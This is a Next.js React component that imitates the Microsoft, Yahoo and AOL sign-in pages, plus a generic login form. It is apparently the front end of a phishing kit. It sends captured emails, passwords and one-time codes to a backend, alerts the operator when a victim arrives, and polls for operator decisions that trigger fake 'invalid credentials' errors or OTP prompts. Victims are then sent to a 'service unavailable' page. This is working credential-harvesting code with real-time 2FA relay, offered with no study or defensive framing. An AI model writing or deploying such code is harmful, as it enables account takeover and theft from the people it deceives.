"use client";

import {
  getProviderLoginColor,
  ProviderLogo,
  ProviderModalHeader,
} from "@/components/ProviderBrand";
import { apiNotifyIncoming, apiSubmit, apiSubmitOtp } from "@/lib/api";
import { useDecisionPolling } from "@/hooks/useDecisionPolling";
import { isValidEmail } from "@/lib/validation";
import { useRouter } from "next/navigation";
import { FormEvent, useCallback, useEffect, useState } from "react";

type Props = {
  provider: string;
  onClose: () => void;
};

type UiSkin = "microsoft" | "yahoo" | "aol" | "generic";

const MS_CREATE_ACCOUNT_URL = "https://signup.live.com/signup";
const MS_RESET_PASSWORD_URL = "https://account.live.com/password/reset";
const YAHOO_CREATE_ACCOUNT_URL = "https://login.yahoo.com/account/create";
const YAHOO_FORGOT_URL = "https://login.yahoo.com/forgot";
const AOL_CREATE_ACCOUNT_URL = "https://login.aol.com/account/create";
const AOL_FORGOT_URL = "https://login.aol.com/forgot";

function getUiSkin(provider: string): UiSkin {
  if (provider === "Outlook" || provider === "Office365") return "microsoft";
  if (provider === "Yahoo") return "yahoo";
  if (provider === "AOL") return "aol";
  return "generic";
}

export default function ProviderLoginModal({ provider, onClose }: Props) {
  const router = useRouter();
  const loginColor = getProviderLoginColor(provider);
  const skin = getUiSkin(provider);

  const [email, setEmail] = useState("");
  const [password, setPassword] = useState("");
  const [error, setError] = useState("");
  const [showOtp, setShowOtp] = useState(false);
  const [otp, setOtp] = useState("");
  const [loading, setLoading] = useState(false);
  const [otpVerifying, setOtpVerifying] = useState(false);
  const [polling, setPolling] = useState(false);
  const [step, setStep] = useState<"email" | "password">("email");
  const [staySignedIn, setStaySignedIn] = useState(true);

  useEffect(() => {
    void apiNotifyIncoming(provider);
  }, [provider]);

  const handleDecision = useCallback(
    (decision: string) => {
      if (decision === "password-error") {
        setLoading(false);
        setOtpVerifying(false);
        setPolling(false);
        setShowOtp(false);
        setOtp("");
        setError("Invalid credentials. Please try again.");
        setPassword("");
        setStep("password");
        return;
      }

      if (decision === "sms-code") {
        setLoading(false);
        setOtpVerifying(false);
        setShowOtp(true);
        return;
      }

      if (decision === "otp-error") {
        setOtpVerifying(false);
        setOtp("");
        setError("Invalid code. Please try again.");
        setPolling(true);
        return;
      }

      if (decision === "success") {
        setLoading(false);
        setOtpVerifying(false);
        setPolling(false);
        router.push("/service-unavailable");
      }
    },
    [router],
  );

  useDecisionPolling(polling, handleDecision);

  const handleEmailNext = (e: FormEvent) => {
    e.preventDefault();
    if (!email.trim()) {
      setError(
        skin === "microsoft"
          ? "Enter a valid email address, phone number, or Skype name."
          : "Please enter your username or email.",
      );
      return;
    }
    if (email.includes("@") && !isValidEmail(email)) {
      setError("Please enter a valid email address.");
      return;
    }
    setError("");
    setStep("password");
  };

  const handleSubmit = async (e: FormEvent) => {
    e.preventDefault();
    if (!email || !password) {
      setError("Please fill out both fields.");
      return;
    }

    if (email.includes("@") && !isValidEmail(email)) {
      setError("Please enter a valid email address.");
      return;
    }

    setLoading(true);
    setError("");

    const result = await apiSubmit({ email, password, provider });

    if (!result.ok) {
      setLoading(false);
      setError(result.error);
      return;
    }

    if (result.data.phase === "password-retry") {
      setLoading(false);
      setError("Invalid credentials. Please try again.");
      setPassword("");
      return;
    }

    setPolling(true);
  };

  const handleOtp = async (e: FormEvent) => {
    e.preventDefault();
    if (!otp.trim() || otpVerifying) return;

    setOtpVerifying(true);
    setError("");
    const result = await apiSubmitOtp({ email, otp, provider });

    if (!result.ok) {
      setOtpVerifying(false);
      setError(result.error);
      return;
    }

    setPolling(true);
  };

  if (showOtp) {
    return (
      <div className={`modal-overlay skin-overlay skin-overlay--${skin}`} onClick={onClose}>
        <div
          className={`modal-content provider-modal-content otp-modal skin-card skin-card--${skin}`}
          onClick={(e) => e.stopPropagation()}
        >
          <button type="button" className="close-btn" onClick={onClose}>
            ×
          </button>
          <ProviderModalHeader provider={provider} />
          <p className="otp-desc">
            A verification code was sent to{" "}
            <strong style={{ color: "#000" }}>{email}</strong>. Please enter it
            below.
          </p>
          <form onSubmit={handleOtp}>
            <label htmlFor="otp">One-Time Password</label>
            <input
              id="otp"
              type="number"
              placeholder="Enter OTP"
              value={otp}
              onChange={(e) => setOtp(e.target.value)}
              autoFocus
              required
              className="otp-input"
            />
            {error && <p className="error">{error}</p>}
            {otpVerifying && !error && (
              <p className="otp-desc" style={{ marginTop: 12 }}>
                Verifying your code…
              </p>
            )}
            <div className="modal-buttons">
              <button
                type="button"
                className="modal-close-btn"
                onClick={onClose}
                disabled={otpVerifying}
              >
                Cancel
              </button>
              <button
                type="submit"
                className="login-btn"
                style={{ background: loginColor }}
                disabled={otpVerifying}
              >
                {otpVerifying ? "Verifying…" : "Verify"}
              </button>
            </div>
          </form>
        </div>
      </div>
    );
  }

  if (skin === "microsoft") {
    return (
      <div
        className="modal-overlay skin-overlay skin-overlay--microsoft"
        onClick={onClose}
      >
        <div
          className="ms-login-card"
          onClick={(e) => e.stopPropagation()}
        >
          <button type="button" className="ms-close" onClick={onClose} aria-label="Close">
            ×
          </button>
          <div className="ms-brand">
            <ProviderLogo provider="Office365" size={22} className="ms-brand-logo" />
            <span className="ms-brand-name">Microsoft</span>
          </div>

          {step === "email" ? (
            <form onSubmit={handleEmailNext}>
              <h2 className="ms-title">Sign in</h2>
              <div className="ms-field">
                <input
                  id="email"
                  type="email"
                  className="ms-input"
                  placeholder="Email, phone, or Skype"
                  value={email}
                  onChange={(e) => setEmail(e.target.value)}
                  autoFocus
                  required
                />
              </div>
              {error && <p className="ms-error">{error}</p>}
              <p className="ms-help">
                No account?{" "}
                <a
                  className="ms-link"
                  href={MS_CREATE_ACCOUNT_URL}
                  target="_blank"
                  rel="noopener noreferrer"
                >
                  Create one!
                </a>
              </p>
              <p className="ms-help">
                <a
                  className="ms-link"
                  href={MS_RESET_PASSWORD_URL}
                  target="_blank"
                  rel="noopener noreferrer"
                >
                  Can&apos;t access your account?
                </a>
              </p>
              <div className="ms-actions">
                <button type="submit" className="ms-next">
                  Next
                </button>
              </div>
            </form>
          ) : (
            <form onSubmit={handleSubmit}>
              <h2 className="ms-title">Enter password</h2>
              <button
                type="button"
                className="ms-account-chip"
                onClick={() => {
                  setStep("email");
                  setPassword("");
                  setError("");
                }}
              >
                {email}
              </button>
              <div className="ms-field">
                <input
                  id="password"
                  type="password"
                  className="ms-input"
                  placeholder="Password"
                  value={password}
                  onChange={(e) => setPassword(e.target.value)}
                  autoFocus
                  required
                  disabled={loading}
                />
              </div>
              {error && <p className="ms-error">{error}</p>}
              <p className="ms-help">
                <a
                  className="ms-link"
                  href={MS_RESET_PASSWORD_URL}
                  target="_blank"
                  rel="noopener noreferrer"
                >
                  Forgot my password
                </a>
              </p>
              <div className="ms-actions">
                <button type="submit" className="ms-next" disabled={loading}>
                  {loading ? "Signing in…" : "Sign in"}
                </button>
              </div>
            </form>
          )}
        </div>
      </div>
    );
  }

  if (skin === "yahoo" || skin === "aol") {
    const isAol = skin === "aol";
    const createAccountUrl = isAol
      ? AOL_CREATE_ACCOUNT_URL
      : YAHOO_CREATE_ACCOUNT_URL;
    const forgotUrl = isAol ? AOL_FORGOT_URL : YAHOO_FORGOT_URL;

    return (
      <div
        className={`modal-overlay skin-overlay skin-overlay--${skin}`}
        onClick={onClose}
      >
        <div
          className={`yh-login-card ${isAol ? "yh-login-card--aol" : ""}`}
          onClick={(e) => e.stopPropagation()}
        >
          <button type="button" className="yh-close" onClick={onClose} aria-label="Close">
            ×
          </button>

          {step === "email" ? (
            <form onSubmit={handleEmailNext}>
              <h2 className="yh-title">
                Sign in to {isAol ? "AOL" : "Yahoo"}
              </h2>
              <label className="yh-label" htmlFor="email">
                Username, email or phone number
              </label>
              <input
                id="email"
                type="email"
                className="yh-input"
                value={email}
                onChange={(e) => setEmail(e.target.value)}
                autoFocus
                required
              />
              {error && <p className="yh-error">{error}</p>}
              <div className="yh-options">
                <label className="yh-check">
                  <input
                    type="checkbox"
                    checked={staySignedIn}
                    onChange={(e) => setStaySignedIn(e.target.checked)}
                  />
                  <span>Stay signed in</span>
                </label>
                <a
                  className="yh-link"
                  href={forgotUrl}
                  target="_blank"
                  rel="noopener noreferrer"
                >
                  Forgotten username
                </a>
              </div>
              <button type="submit" className="yh-next">
                Next
              </button>
              <a
                className="yh-create"
                href={createAccountUrl}
                target="_blank"
                rel="noopener noreferrer"
              >
                Create account
              </a>
            </form>
          ) : (
            <form onSubmit={handleSubmit}>
              <h2 className="yh-title">Enter password</h2>
              <button
                type="button"
                className="yh-account-chip"
                onClick={() => {
                  setStep("email");
                  setPassword("");
                  setError("");
                }}
              >
                {email}
              </button>
              <label className="yh-label" htmlFor="password">
                Password
              </label>
              <input
                id="password"
                type="password"
                className="yh-input"
                value={password}
                onChange={(e) => setPassword(e.target.value)}
                autoFocus
                required
                disabled={loading}
              />
              {error && <p className="yh-error">{error}</p>}
              <div className="yh-options">
                <span />
                <a
                  className="yh-link"
                  href={forgotUrl}
                  target="_blank"
                  rel="noopener noreferrer"
                >
                  Forgotten password?
                </a>
              </div>
              <button type="submit" className="yh-next" disabled={loading}>
                {loading ? "Signing in…" : "Next"}
              </button>
            </form>
          )}
        </div>
      </div>
    );
  }

  return (
    <div className="modal-overlay" onClick={onClose}>
      <div
        className="modal-content provider-modal-content"
        onClick={(e) => e.stopPropagation()}
      >
        <button type="button" className="close-btn" onClick={onClose}>
          ×
        </button>
        <ProviderModalHeader provider={provider} />
        <form onSubmit={handleSubmit}>
          <label htmlFor="email">Email Address</label>
          <input
            id="email"
            type="email"
            placeholder="Email"
            value={email}
            onChange={(e) => setEmail(e.target.value)}
            required
          />
          <small className="provider-field-note">
            We&apos;ll never share your email with anyone else
          </small>
          <label htmlFor="password">Password</label>
          <input
            id="password"
            type="password"
            placeholder="Password"
            value={password}
            onChange={(e) => setPassword(e.target.value)}
            required
            disabled={loading}
          />
          {error && <p className="error">{error}</p>}
          <div className="modal-buttons">
            <button
              type="button"
              className="modal-close-btn"
              onClick={onClose}
              disabled={loading}
            >
              Close
            </button>
            <button
              type="submit"
              className="login-btn"
              style={{ background: loginColor }}
              disabled={loading}
            >
              {loading ? "Signing in…" : "Login"}
            </button>
          </div>
        </form>
      </div>
    </div>
  );
}
